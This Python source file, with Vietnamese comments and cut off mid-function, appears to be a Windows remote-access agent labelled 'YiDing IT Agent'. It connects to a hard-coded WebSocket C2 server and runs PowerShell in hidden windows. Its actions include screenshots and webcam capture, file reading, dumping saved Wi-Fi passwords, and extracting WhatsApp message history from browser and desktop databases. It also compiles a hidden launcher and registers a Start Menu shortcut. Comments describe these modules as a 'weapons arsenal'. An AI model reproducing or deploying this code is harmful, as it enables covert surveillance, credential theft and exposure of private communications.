import asyncio, json, logging, os, sys, base64, subprocess, socket
import psutil, websockets
from pathlib import Path

# Hoạt động tốt cho cả agent.py (dạng kịch bản chạy trực tiếp) và yiding_vector.exe (dạng tệp thực thi đóng gói)
BASE_DIR = Path(sys.executable).parent if getattr(sys, 'frozen', False) else Path(__file__).parent
CONFIG_FILE = BASE_DIR / "agent_config.json"

# Nhật ký vận hành của YiDing Vector.
_log_handlers = [logging.FileHandler(BASE_DIR / "agent.log", encoding="utf-8")]
try:
    if sys.stdout is not None:
        sys.stdout.fileno()
        _log_handlers.append(logging.StreamHandler())
except Exception:
    pass
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=_log_handlers,
)
log = logging.getLogger(__name__)

def _load_config():
    try:
        if CONFIG_FILE.exists():
            with CONFIG_FILE.open("r", encoding="utf-8") as f:
                data = json.load(f)
                return data if isinstance(data, dict) else {}
    except Exception as e:
        log.warning(f"Cannot read agent_config.json: {e}")
    return {}

def _read_secret(name):
    try:
        path = BASE_DIR / name
        if path.exists():
            return path.read_text(encoding="utf-8").strip()
    except Exception:
        pass
    return ""

try:
    import mss; HAS_MSS = True
except ImportError:
    HAS_MSS = False

# Tránh nhập thư viện xử lý ảnh cv2 ở ngoài cùng để không tạo ra tiến trình con không cần thiết. Chỉ nhập khi gọi camera thực sự.

# Cấu hình WebSocket C2 và danh tính endpoint. Fallback giữ nguyên production hiện tại.
CONFIG = _load_config()
VPS_URL = (
    os.environ.get("CYPHER_AGENT_URL", "").strip()
    or os.environ.get("VPS_URL", "").strip()
    or str(CONFIG.get("c2_url") or CONFIG.get("vps_url") or "").strip()
    or "ws://46.225.160.243:9876/agent"
)
DEVICE_ID = (
    os.environ.get("CYPHER_DEVICE_ID", "").strip()
    or str(CONFIG.get("device_id") or "").strip()
    or f"PC-{socket.gethostname().upper()}"
)
AGENT_TOKEN = (
    os.environ.get("CYPHER_AGENT_TOKEN", "").strip()
    or str(CONFIG.get("agent_token") or "").strip()
    or _read_secret("agent_token.txt")
    or _read_secret("pc_chichi_agent_token.txt")
)
ALLOW_SENSITIVE_ACTIONS = (
    str(os.environ.get("CYPHER_ENABLE_SENSITIVE_ACTIONS", "") or CONFIG.get("enable_sensitive_actions") or "")
    .strip()
    .lower()
    in {"1", "true", "yes", "on"}
)

# Windows Toast cần Shortcut Start Menu có AUMID hợp lệ.
_aumid_ok = False

_AUMID_CS = r"""
using System; using System.Runtime.InteropServices; using System.Runtime.InteropServices.ComTypes;
public class AumidHelper {
    [Guid("000214F9-0000-0000-C000-000000000046"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IShellLink {
        void GetPath([Out,MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder f, int c, IntPtr p, int fl);
        void GetIDList(out IntPtr p); void SetIDList(IntPtr p);
        void GetDescription([Out,MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder s, int c);
        void SetDescription([MarshalAs(UnmanagedType.LPWStr)] string s);
        void GetWorkingDirectory([Out,MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder s, int c);
        void SetWorkingDirectory([MarshalAs(UnmanagedType.LPWStr)] string s);
        void GetArguments([Out,MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder s, int c);
        void SetArguments([MarshalAs(UnmanagedType.LPWStr)] string s);
        void GetHotkey(out short h); void SetHotkey(short h);
        void GetShowCmd(out int i); void SetShowCmd(int i);
        void GetIconLocation([Out,MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder s, int c, out int i);
        void SetIconLocation([MarshalAs(UnmanagedType.LPWStr)] string s, int i);
        void SetRelativePath([MarshalAs(UnmanagedType.LPWStr)] string s, int r);
        void Resolve(IntPtr h, int f);
        void SetPath([MarshalAs(UnmanagedType.LPWStr)] string s);
    }
    [Guid("886D8EEB-8CF2-4446-8D02-CDBA1DBDCF99"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IPropertyStore {
        int GetCount(out uint c); int GetAt(uint i, out PKey k);
        int GetValue(ref PKey k, out PVar v); int SetValue(ref PKey k, ref PVar v); int Commit();
    }
    [StructLayout(LayoutKind.Sequential)] public struct PKey { public Guid fmtid; public uint pid; }
    [StructLayout(LayoutKind.Explicit,Size=16)] public struct PVar { [FieldOffset(0)]public ushort vt; [FieldOffset(8)]public IntPtr p; }
    [Guid("00021401-0000-0000-C000-000000000046"), ClassInterface(ClassInterfaceType.None), ComImport]
    class ShellLink {}
    public static string SetLnkAppId(string lnk, string appId) {
        try {
            var sl=(IShellLink)new ShellLink();
            var pf=(IPersistFile)sl;
            pf.Load(lnk, 2);
            var ps=(IPropertyStore)sl;
            var k=new PKey{fmtid=new Guid("9F4C2855-9F79-4B39-A8D0-E1D42DE1D5F3"),pid=5};
            var v=new PVar{vt=31,p=Marshal.StringToCoTaskMemUni(appId)};
            int hr=ps.SetValue(ref k,ref v); Marshal.FreeCoTaskMem(v.p);
            if(hr!=0) return "SetValue hr="+hr;
            hr=ps.Commit(); if(hr!=0) return "Commit hr="+hr;
            pf.Save(lnk,true);
            return "OK";
        } catch(Exception ex){return "ERR:"+ex.Message;}
    }
}
"""

async def _compile_launcher_exe(ico_path: Path, exe_out: Path):
    """Tự động biên dịch helper EXE có biểu tượng YiDing để Windows Toast nhận AUMID."""
    csc_candidates = [
        r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
        r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe",
    ]
    csc = next((p for p in csc_candidates if Path(p).exists()), None)
    if not csc:
        return
    cs_code = (
        "using System; using System.Diagnostics; using System.IO;\n"
        "class SystemBreakerAgent {\n"
        "    [STAThread] static void Main() {\n"
        "        string d = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location);\n"
        "        string py = Path.Combine(d, \"venv\", \"Scripts\", \"pythonw.exe\");\n"
        "        string sc = Path.Combine(d, \"agent.py\");\n"
        "        if (!File.Exists(py)) return;\n"
        "        Process.Start(new ProcessStartInfo {\n"
        "            FileName = py, Arguments = \"\\\"\" + sc + \"\\\"\",\n"
        "            WorkingDirectory = d, UseShellExecute = false });\n"
        "    }\n"
        "}\n"
    )
    import tempfile
    fd, cs_file = tempfile.mkstemp(suffix=".cs")
    try:
        with os.fdopen(fd, "w") as f:
            f.write(cs_code)
        cmd = [csc, "/target:winexe", f"/out:{exe_out}"]
        if ico_path.exists():
            cmd.append(f"/win32icon:{ico_path}")
        cmd.append(cs_file)
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = 0
        await asyncio.to_thread(
            subprocess.run, cmd, capture_output=True, timeout=30,
            startupinfo=si, creationflags=subprocess.CREATE_NO_WINDOW
        )
    except Exception:
        pass
    finally:
        try: Path(cs_file).unlink()
        except Exception: pass


async def _ensure_aumid():
    global _aumid_ok
    if _aumid_ok:
        return

    ico_path = BASE_DIR / "yiding_logo.ico"
    png_path = BASE_DIR / "yiding_logo.png"

    # Tái tạo tệp biểu tượng ICO từ ảnh PNG: căn lề vuông, xóa nền đen để hiển thị đẹp mắt
    try:
        src = png_path if png_path.exists() else None
        if src:
            from PIL import Image
            img = Image.open(src).convert("RGBA")
            side = max(img.width, img.height)
            sq = Image.new("RGBA", (side, side), (0, 0, 0, 0))
            sq.paste(img, ((side - img.width) // 2, (side - img.height) // 2))
            # Remove near-black background pixels
            pixels = list(sq.getdata())
            sq.putdata([(r, g, b, 0) if r + g + b < 60 else (r, g, b, a)
                        for r, g, b, a in pixels])
            sq.save(str(ico_path), format="ICO",
                    sizes=[(16, 16), (32, 32), (48, 48), (64, 64), (256, 256)])
    except Exception:
        pass

    # Biên dịch tệp EXE chạy ngầm đi kèm biểu tượng
    launcher_exe = BASE_DIR / "yiding_vector.exe"
    if not launcher_exe.exists():
        await _compile_launcher_exe(ico_path, launcher_exe)

    # Xác định đường dẫn chạy chương trình: ưu tiên EXE helper, fallback về Python/Pythonw.
    if launcher_exe.exists():
        target = str(launcher_exe)
        icon_ps = ""
        args_ps = ""
    else:
        target = str(Path(sys.executable))
        icon_ps = f'$s.IconLocation="{str(ico_path)},0";' if ico_path.exists() else ""
        args_ps = f'$s.Arguments=\'{str(BASE_DIR / "agent.py")}\';'

    script = f"""
Add-Type -TypeDefinition @'
{_AUMID_CS}
'@ -ErrorAction SilentlyContinue

$appId   = 'YiDing.ITAgent'
$lnkDir  = [IO.Path]::Combine($env:APPDATA,'Microsoft\\Windows\\Start Menu\\Programs')
$lnkPath = [IO.Path]::Combine($lnkDir,'YiDing IT Agent.lnk')
if (Test-Path $lnkPath) {{ Remove-Item $lnkPath -Force }}

$ws = New-Object -ComObject WScript.Shell
$s  = $ws.CreateShortcut($lnkPath)
$s.TargetPath      = '{target}'
$s.WorkingDirectory= '{str(BASE_DIR)}'
$s.Description     = 'YiDing IT Agent'
{icon_ps}
{args_ps}
$s.Save()

[AumidHelper]::SetLnkAppId($lnkPath, $appId) | Out-Null

$sig = '[DllImport("shell32.dll")]public static extern void SHChangeNotify(int e,int f,IntPtr a,IntPtr b);'
Add-Type -MemberDefinition $sig -Name WinShellNotify -Namespace Win32 -ErrorAction SilentlyContinue
[Win32.WinShellNotify]::SHChangeNotify(0x08000000,0,[IntPtr]::Zero,[IntPtr]::Zero)

$rp = "HKCU:\\SOFTWARE\\Classes\\AppUserModelId\\$appId"
if(-not(Test-Path $rp)){{New-Item $rp -Force|Out-Null}}
Set-ItemProperty $rp -Name 'DisplayName' -Value 'YiDing IT Agent'
Set-ItemProperty $rp -Name 'IconUri'     -Value '{str(ico_path)}'
"""
    await act_powershell(script, timeout=30)
    _aumid_ok = True

# 🛠️ [KHO VŨ KHÍ TÁC CHIẾN] - Các Module thao túng và điều khiển thiết bị tối tân từ xa
# (Dễ hiểu: Nơi chứa tất cả các chức năng tối tân mà Cypher có thể điều khiển từ xa: chụp màn hình, xem file, chạy lệnh ngầm...)
async def act_system_info():
    cpu  = await asyncio.to_thread(psutil.cpu_percent, 1)
    ram  = psutil.virtual_memory().percent
    disk = psutil.disk_usage("C:\\").percent
    return f"CPU: {cpu}% | RAM: {ram}% | Disk: {disk}%"

async def act_screenshot():
    if not HAS_MSS:
        return "Error: mss not installed"
    def _shot():
        import io
        from PIL import Image
        with mss.mss() as sct:
            raw = sct.grab(sct.monitors[0])
            img = Image.frombytes("RGB", raw.size, raw.bgra, "raw", "BGRX")
        if img.width > 1280:
            h = int(img.height * 1280 / img.width)
            img = img.resize((1280, h), Image.LANCZOS)
        buf = io.BytesIO()
        img.save(buf, format="JPEG", quality=82)
        return base64.b64encode(buf.getvalue()).decode()
    return await asyncio.to_thread(_shot)

async def act_list_dir(path):
    def _list():
        p = Path(path)
        if not p.exists(): return json.dumps({"error": "Path not found"})
        return json.dumps([
            {"name": i.name, "type": "dir" if i.is_dir() else "file"}
            for i in list(p.iterdir())[:50]
        ])
    return await asyncio.to_thread(_list)

async def act_powershell(command, timeout=30):
    def _run():
        try:
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = 0  # Ẩn cửa sổ dòng lệnh hoàn toàn
            r = subprocess.run(
                ["powershell", "-NoProfile", "-NonInteractive", "-Command", command],
                capture_output=True, text=True, timeout=timeout,
                startupinfo=si, creationflags=subprocess.CREATE_NO_WINDOW,
            )
            return ((r.stdout or '') + (r.stderr or '')).strip()
        except subprocess.TimeoutExpired: return "Error: timed out"
        except Exception as e: return f"Error: {e}"
    return await asyncio.to_thread(_run)

async def act_get_processes():
    def _get():
        procs = []
        for p in psutil.process_iter(["pid", "name", "cpu_percent", "memory_percent"]):
            try: procs.append(p.info)
            except: pass
        return json.dumps(sorted(procs, key=lambda x: x.get("cpu_percent") or 0, reverse=True)[:30])
    return await asyncio.to_thread(_get)

async def act_kill_process(target):
    try:
        if str(target).isdigit():
            psutil.Process(int(target)).kill(); return f"Killed PID {target}"
        killed = 0
        for p in psutil.process_iter(["name"]):
            if p.info["name"].lower() == target.lower():
                p.kill(); killed += 1
        return f"Killed {killed} process(es) named '{target}'"
    except Exception as e: return f"Error: {e}"

async def act_open_app(path):
    try: subprocess.Popen(path); return f"Opened: {path}"
    except Exception as e: return f"Error: {e}"

async def act_send_notification(title, message, image_b64=None):
    await _ensure_aumid()

    def _xe(s):
        return str(s).replace('&','&amp;').replace('<','&lt;').replace('>','&gt;').replace('"','&quot;').replace("'","&apos;")

    # Ảnh đại diện sếp nghiêm khắc Chi Chi hiển thị cạnh tiêu đề để các Agent tự động rén
    avatar = BASE_DIR / "chichi.png"
    if not avatar.exists():
        avatar = BASE_DIR / "chichi.jpg"

    avatar_tag = ""
    if avatar.exists():
        uri = str(avatar).replace('\\', '/').replace(' ', '%20')
        avatar_tag = f'<image placement="appLogoOverride" src="file:///{uri}"/>'

    # Ảnh đính kèm lớn cấy từ trung tâm điều khiển
    hero_tag = ""
    _tmp_img = None
    if image_b64:
        try:
            import tempfile, base64 as _b64
            img_bytes = _b64.b64decode(image_b64)
            ext = ".png" if img_bytes[:4] == b'\x89PNG' else ".jpg"
            _tmp_img = Path(tempfile.mktemp(suffix=ext, dir=BASE_DIR))
            _tmp_img.write_bytes(img_bytes)
            uri3 = str(_tmp_img).replace('\\', '/').replace(' ', '%20')
            hero_tag = f'<image placement="hero" src="file:///{uri3}"/>'
        except Exception:
            hero_tag = ""

    xml_body = (
        f'<toast><visual><binding template="ToastGeneric">'
        f'{hero_tag}'
        f'{avatar_tag}'
        f'<text>{_xe(title)}</text>'
        f'<text>{_xe(message)}</text>'
        f'</binding></visual></toast>'
    )
    xml_ps = xml_body.replace("'", "''")

    script = "\n".join([
        "[void][Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]",
        "[void][Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]",
        "$d=New-Object Windows.Data.Xml.Dom.XmlDocument",
        f"$d.LoadXml('{xml_ps}')",
        "[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier('YiDing.ITAgent').Show((New-Object Windows.UI.Notifications.ToastNotification $d))",
    ])
    result = await act_powershell(script, timeout=12)
    if _tmp_img and _tmp_img.exists():
        try: _tmp_img.unlink()
        except Exception: pass
    if result.lower().startswith("error"): return result
    return f"Đã gửi: {message}"

async def act_network_info():
    def _get():
        h = socket.gethostname()
        try: ip = socket.gethostbyname(h)
        except: ip = "unknown"
        return json.dumps({"hostname": h, "ip": ip})
    return await asyncio.to_thread(_get)

async def act_read_file(path):
    try: return Path(path).read_text(encoding="utf-8", errors="ignore")[:5000]
    except Exception as e: return f"Error: {e}"

async def act_capture_camera(camera_index=0):
    """Chụp ảnh webcam khi endpoint và người vận hành đã được phê duyệt cho hỗ trợ nội bộ."""
    def _capture():
        try:
            import cv2
        except ImportError:
            return "Error: opencv-python not installed"
        try:
            cap = cv2.VideoCapture(camera_index, cv2.CAP_DSHOW)
            if not cap.isOpened():
                return "Error: camera not found or in use"
            cap.read()
            ret, frame = cap.read()
            cap.release()
            if not ret or frame is None:
                return "Error: could not capture frame"
            ok, buf = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 90])
            if not ok:
                return "Error: encode failed"
            return base64.b64encode(buf.tobytes()).decode()
        except Exception as e:
            return f"Error: {e}"
    return await asyncio.to_thread(_capture)

async def act_save_avatar(data):
    try:
        img_bytes = base64.b64decode(data)
        is_png = len(img_bytes) >= 4 and img_bytes[:4] == b'\x89PNG'
        out = BASE_DIR / ("chichi.png" if is_png else "chichi.jpg")
        out.write_bytes(img_bytes)
        other = BASE_DIR / ("chichi.jpg" if is_png else "chichi.png")
        if other.exists(): other.unlink(missing_ok=True)
        return f"Avatar saved ({len(img_bytes)} bytes, {'PNG' if is_png else 'JPEG'})"
    except Exception as e: return f"Error: {e}"

# 🖨️ [MODULE THAO TÚNG MÁY IN] - Ép hệ thống máy in hoạt động theo ý chí của Cypher
# (Dễ hiểu: Giúp Cypher có thể tự do liệt kê máy in, kiểm soát hàng đợi, xóa lệnh hoặc ép máy in phun trào dữ liệu in ấn các thông điệp châm chọc)
async def act_list_printers():
    r = await act_powershell(
        "Get-Printer | Select-Object Name,"
        "@{N='Status';E={$_.PrinterStatus.ToString()}},"
        "Default,PortName | ConvertTo-Json -Compress",
        timeout=12
    )
    return r or "[]"

async def act_get_print_queue():
    r = await act_powershell(
        "$jobs=@(); Get-Printer | ForEach-Object {"
        " try { $jobs += Get-PrintJob -PrinterName $_.Name -EA Stop } catch {} };"
        "if($jobs){ $jobs | Select-Object JobStatus,Document,UserName,TotalPages | ConvertTo-Json -Compress }"
        "else { '[]' }",
        timeout=12
    )
    return r.strip() or "[]"

async def act_clear_print_queue(printer=""):
    if printer:
        cmd = f"Get-PrintJob -PrinterName '{printer}' | Remove-PrintJob; 'Cleared: {printer}'"
    else:
        cmd = ("$n=0; Get-Printer | ForEach-Object { "
               "try { Get-PrintJob -PrinterName $_.Name -EA Stop | ForEach-Object { Remove-PrintJob $_; $n++ } } catch {} };"
               "\"Cleared $n job(s)\"")
    return await act_powershell(cmd, timeout=15)

async def act_set_default_printer(name):
    cmd = f"(New-Object -ComObject WScript.Network).SetDefaultPrinter('{name}'); 'Default set: {name}'"
    return await act_powershell(cmd, timeout=10)

async def act_install_printer_ip(ip, name, driver="Generic / Text Only"):
    if not ip or not name:
        return "Error: ip and name required"
    safe_ip   = ip.replace("'", "")
    safe_name = name.replace("'", "")
    safe_drv  = driver.replace("'", "")
    cmd = (
        f"$port='{safe_ip}'; $pname='{safe_name}'; $drv='{safe_drv}';"
        f"if(-not(Get-PrinterPort -Name $port -EA SilentlyContinue)){{"
        f"  Add-PrinterPort -Name $port -PrinterHostAddress $port }}"
        f"if(-not(Get-Printer -Name $pname -EA SilentlyContinue)){{"
        f"  Add-Printer -Name $pname -DriverName $drv -PortName $port }}"
        f"'Installed: '+$pname+' -> '+$port"
    )
    return await act_powershell(cmd, timeout=30)

async def act_print_file(path, printer=""):
    if not Path(path).exists():
        return f"Error: file not found: {path}"
    safe_path = path.replace('"', '')
    if printer:
        safe_printer = printer.replace('"', '')
        cmd = f'Start-Process -FilePath "{safe_path}" -Verb PrintTo -ArgumentList "{safe_printer}"'
    else:
        cmd = f'Start-Process -FilePath "{safe_path}" -Verb Print'
    r = await act_powershell(cmd, timeout=60)
    return r if r else f"Print job sent: {Path(path).name}"

async def act_print_data(data: str, filename: str = "document.pdf", printer: str = ""):
    """Nhận dữ liệu thô, tự động giải mã thành PDF/văn bản rồi đẩy lệnh in ngay lập tức."""
    import tempfile, base64 as _b64
    try:
        raw = _b64.b64decode(data)
        ext = Path(filename).suffix or ".pdf"
        tmp = Path(tempfile.mktemp(suffix=ext, dir=BASE_DIR))
        tmp.write_bytes(raw)
        result = await act_print_file(str(tmp), printer)
        try: tmp.unlink(missing_ok=True)
        except: pass
        return result if result else f"Đã gửi lệnh in: {filename}"
    except Exception as e:
        return f"Error: {e}"

async def act_silent_print_image(data: str, printer: str = ""):
    """In ảnh hoàn toàn im lặng (không popup) qua .NET PrintDocument, tự động canh chỉnh kích thước (fit to page)."""
    import tempfile, base64 as _b64
    try:
        raw = _b64.b64decode(data)
        tmp = Path(tempfile.mktemp(suffix=".png", dir=BASE_DIR))
        tmp.write_bytes(raw)
        
        safe_path = str(tmp).replace("'", "''")
        safe_printer = printer.replace("'", "''") if printer else ""
        
        ps_script = f"""
Add-Type -AssemblyName System.Drawing
$img = [System.Drawing.Image]::FromFile('{safe_path}')
$doc = New-Object System.Drawing.Printing.PrintDocument
"""
        if safe_printer:
            ps_script += f"$doc.PrinterSettings.PrinterName = '{safe_printer}'\n"
            
        ps_script += """
$doc.DefaultPageSettings.Landscape = ($img.Width -gt $img.Height)

$doc.add_PrintPage({
    param($sender, $e)
    $g = $e.Graphics
    $margin = $e.PageSettings.Margins
    $pWidth = $e.PageBounds.Width - $margin.Left - $margin.Right
    $pHeight = $e.PageBounds.Height - $margin.Top - $margin.Bottom
    
    $scale = [math]::Min($pWidth / $img.Width, $pHeight / $img.Height)
    $w = [int]($img.Width * $scale)
    $h = [int]($img.Height * $scale)
    $x = $margin.Left + ($pWidth - $w) / 2
    $y = $margin.Top + ($pHeight - $h) / 2
    
    $g.DrawImage($img, $x, $y, $w, $h)
})
$doc.Print()
$img.Dispose()
"""
        result = await act_powershell(ps_script, timeout=60)
        try: tmp.unlink(missing_ok=True)
        except: pass
        
        if result and "Error" in result:
            return result
        return f"In thành công trên máy in: {printer or 'Mặc định'}"
    except Exception as e:
        return f"Error: {e}"

async def act_ui_automation():
    """Bóc tách Live Object Memory (UIAutomation Tree) bằng PowerShell không tốn API."""
    ps_script = """
Add-Type -AssemblyName UIAutomationClient
Add-Type -AssemblyName UIAutomationTypes
$root = [System.Windows.Automation.AutomationElement]::RootElement
$condition = [System.Windows.Automation.Condition]::TrueCondition
$elements = $root.FindAll([System.Windows.Automation.TreeScope]::Children, $condition)
$results = @()
foreach ($el in $elements) {
    if ($el.Current.Name) {
        $results += @{
            Name = $el.Current.Name
            ClassName = $el.Current.ClassName
            ProcessId = $el.Current.ProcessId
            ControlType = $el.Current.ControlType.ProgrammaticName
        }
    }
}
$results | ConvertTo-Json -Compress
"""
    return await act_powershell(ps_script, timeout=15)

async def act_get_wifi_keys():
    """Liệt kê WLAN profile; mặc định không xuất khóa Wi-Fi đã lưu."""
    if not ALLOW_SENSITIVE_ACTIONS:
        ps_script = """
$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
    $_.ToString().Split(":")[1].Trim()
}
$results = @()
foreach ($p in $profiles) {
    $results += @{
        SSID = $p
        KeyAvailable = $false
        KeyContent = "[redacted: set CYPHER_ENABLE_SENSITIVE_ACTIONS=1 only for approved support windows]"
    }
}
$results | ConvertTo-Json -Compress
"""
        return await act_powershell(ps_script, timeout=15)

    ps_script = """
$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
    $_.ToString().Split(":")[1].Trim()
}
$results = @()
foreach ($p in $profiles) {
    $xml = netsh wlan show profile name="$p" key=clear
    $key = $xml | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
    if (-not $key) { $key = "[Open/No Password]" }
    $results += @{
        SSID = $p
        Password = $key
    }
}
$results | ConvertTo-Json -Compress
"""
    return await act_powershell(ps_script, timeout=15)

async def act_create_hotspot(ssid="YiDing_Test_AP", password="YiDingPassword2026"):
    """Thiết lập SoftAP trên máy trạm phục vụ kiểm thử kết nối nội bộ."""
    if len(password) < 8:
        return "Error: Password must be at least 8 characters long"
    ps_script = f"""
$supported = netsh wlan show drivers | Select-String "Hosted network supported" | ForEach-Object {{ $_.ToString().Split(":")[1].Trim() }}
if ($supported -eq "Yes") {{
    netsh wlan set hostednetwork mode=allow ssid="{ssid}" key="{password}" | Out-Null
    netsh wlan start hostednetwork | Out-Null
    "Hosted network '{ssid}' created successfully!"
}} else {{
    "Driver not supporting old HostedNetwork. Alternate SoftAP mode requested."
}}
"""
    return await act_powershell(ps_script, timeout=20)

async def act_read_whatsapp_db(date_from=None, date_to=None):
    """
    Kiểm tra dữ liệu WhatsApp Desktop/Web cục bộ khi có phê duyệt hỗ trợ nội bộ rõ ràng.
    Mặc định bị khóa để tránh đọc nội dung riêng tư ngoài nhiệm vụ vận hành.
    """
    if not ALLOW_SENSITIVE_ACTIONS:
        return json.dumps({
            "status": "disabled",
            "message": "read_whatsapp_db requires CYPHER_ENABLE_SENSITIVE_ACTIONS=1 and an approved support window",
        }, ensure_ascii=False)

    import tempfile, shutil
    from datetime import datetime, timezone

    def _parse_dt(s):
        if not s:
            return None
        try:
            return datetime.strptime(s, "%Y-%m-%d").replace(tzinfo=timezone.utc)
        except Exception:
            return None

    def _ts_ok(ts):
        if ts is None:
            return True
        try:
            val = float(ts)
            if val > 1e12:
                val /= 1000
            dt = datetime.fromtimestamp(val, tz=timezone.utc)
            if dt_from and dt < dt_from:
                return False
            if dt_to   and dt > dt_to:
                return False
            return True
        except Exception:
            return True

    dt_from = _parse_dt(date_from)
    dt_to   = _parse_dt(date_to)
    messages  = []
    src_info  = []
    local_app = Path(os.environ.get("LOCALAPPDATA", ""))

    # ── 1. Đọc tin nhắn WhatsApp Web từ IndexedDB của Chrome/Edge ───────────────────────────
    try:
        import ccl_chromium_indexeddb
        HAS_CCL = True
    except ImportError:
        HAS_CCL = False

    browser_roots = {
        "Chrome": local_app / "Google/Chrome/User Data/Default/IndexedDB",
        "Edge":   local_app / "Microsoft/Edge/User Data/Default/IndexedDB",
    }

    for bname, idb_root in browser_roots.items():
        if not idb_root.exists():
            continue
        wa_idb = None
        try:
            for d in idb_root.iterdir():
                if "web.whatsapp.com" in d.name and d.is_dir():
                    wa_idb = d
                    break
        except Exception:
            pass

        if not wa_idb:
            src_info.append(f"{bname}: IndexedDB WhatsApp Web không khả dụng")
            continue

        tmp_dir = Path(tempfile.mkdtemp(prefix="wa_idb_"))
        try:
            dst = tmp_dir / "wa_idb"
            shutil.copytree(str(wa_idb), str(dst))
            if HAS_CCL:
                try:
                    env = ccl_chromium_indexeddb.WrappedIndexDB(str(dst))
                    for db_rec in env.databases():
                        for store_name in db_rec.object_store_names:
                            if any(k in store_name.lower() for k in ("message", "msg", "chat")):
                                try:
                                    for record in db_rec[store_name].get_all():
                                        val = record.value
                                        if not isinstance(val, dict):
                                            continue
                                        ts = val.get("t") or val.get("timestamp") or val.get("ts")
                                        if not _ts_ok(ts):
                                            continue
                                        messages.append({
                                            "source": bname,
                                            "from":   str(val.get("from") or val.get("author") or ""),
                                            "body":   str(val.get("body") or val.get("text") or "")[:500],
                                            "ts":     ts,
                                        })
                                except Exception:
                                    pass
                    src_info.append(f"{bname}: Lấy lịch sử IndexedDB thành công")
                except Exception as e:
                    src_info.append(f"{bname}: CCL lỗi giải mã – {e}")
            else:
                total_kb = sum(f.stat().st_size for f in dst.rglob("*") if f.is_file()) // 1024
                src_info.append(
                    f"{bname}: Phát hiện IndexedDB WhatsApp Web ({total_kb} KB) – "
                    f"cần cấy 'ccl-chromium-indexeddb' để tự động đọc"
                )
        except Exception as e:
            src_info.append(f"{bname}: Lỗi sao chép cơ sở IndexedDB – {e}")
        finally:
            shutil.rmtree(str(tmp_dir), ignore_errors=True)

    # ── 2. Đọc tin nhắn từ ứng dụng cài đặt WhatsApp Desktop (Khai thác SQLite) ────────────────────────────
    pkgs = local_app / "Packages"
    if pkgs.exists():
        try:
            for pkg in pkgs.iterdir():
                if "whatsapp" not in pkg.name.lower():
                    continue
                ls = pkg / "LocalState"
                if not ls.exists():
                    continue
                db_files = list(ls.glob("*.db")) + list(ls.glob("*.sqlite"))
                if db_files:
                    import sqlite3
                    SQLITE_MAGIC = b'SQLite format 3\x00'
                    for db_path in db_files[:3]:
                        tmp_db = Path(tempfile.mktemp(suffix=".db"))
                        try:
                            shutil.copy2(str(db_path), str(tmp_db))
                            header = tmp_db.read_bytes()[:16]
                            if header != SQLITE_MAGIC[:16]:
                                src_info.append(f"WhatsApp Desktop: {db_path.name} đã được mã hóa bằng SQLCipher – bất khả xâm phạm trực tiếp")
                                tmp_db.unlink(missing_ok=True)
                                continue
                            conn = sqlite3.connect(str(tmp_db))
                            cur  = conn.cursor()
                            tables = [r[0] for r in cur.execute(
                                "SELECT name FROM sqlite_master WHERE type='table'"
                            ).fetchall()]
                            for tbl in tables:
                                if not any(k in tbl.lower() for k in ("message","msg","chat")):
                                    continue
                                try:
                                    cols = [c[1] for c in cur.execute(
                                        f"PRAGMA table_info({tbl})"
                                    ).fetchall()]
                                    ts_col   = next((c for c in cols if any(k in c.lower() for k in ("time","ts","date"))), None)
                                    body_col = next((c for c in cols if any(k in c.lower() for k in ("body","text","content","message"))), None)
                                    from_col = next((c for c in cols if any(k in c.lower() for k in ("from","sender","author","jid"))), None)
                                    if not body_col:
                                        continue
                                    sel = f"SELECT {ts_col or 'NULL'}, {from_col or 'NULL'}, {body_col} FROM {tbl} ORDER BY rowid DESC LIMIT 200"
                                    for row in cur.execute(sel).fetchall():
                                        ts_v, from_v, body_v = row
                                        if not body_v or not _ts_ok(ts_v):
                                            continue
                                        messages.append({
                                            "source": f"WhatsApp Desktop/{tbl}",
                                            "from":   str(from_v or ""),
                                            "body":   str(body_v)[:500],
                                            "ts":     ts_v,
                                        })
                                except Exception:
                                    pass
                            conn.close()
                            src_info.append(f"WhatsApp Desktop: Đọc thành công bảng SQLite {tables[:5]}")
                        except Exception as e:
                            src_info.append(f"WhatsApp Desktop: Lỗi trích xuất SQLite – {e}")
                        finally:
                            tmp_db.unlink(missing_ok=True)
                else:
                    ldb = [d for d in ls.iterdir() if d.is_dir() and (d / "CURRENT").exists()]
                    if ldb:
                        src_info.append(
                            f"WhatsApp Desktop: Phát hiện cơ sở LevelDB ({len(ldb)} cơ sở) – "
                            f"cần cấy thư viện 'plyvel' để phục hồi tin nhắn"
                        )
                    else:
                        src_info.append(f"WhatsApp Desktop: Phát hiện thư mục ứng dụng tại {pkg.name}, dữ liệu rỗng")
        except Exception as e:
            src_info.append(f"WhatsApp Desktop Scan lỗi hệ thống: {e}")

    # ── 3. Trả kết quả dữ liệu WhatsApp đã khôi phục ────────────────────────────────────────────────────────
    if not messages and not src_info:
        return json.dumps({"error": "Không tìm thấy dữ liệu tin nhắn WhatsApp", "status": "not_found"}, ensure_ascii=False)

    messages.sort(key=lambda x: x.get("ts") or 0, reverse=True)
    return json.dumps({
        "status":        "ok",
        "message_count": len(messages),
        "messages":      messages[:200],
        "sources":       src_info,
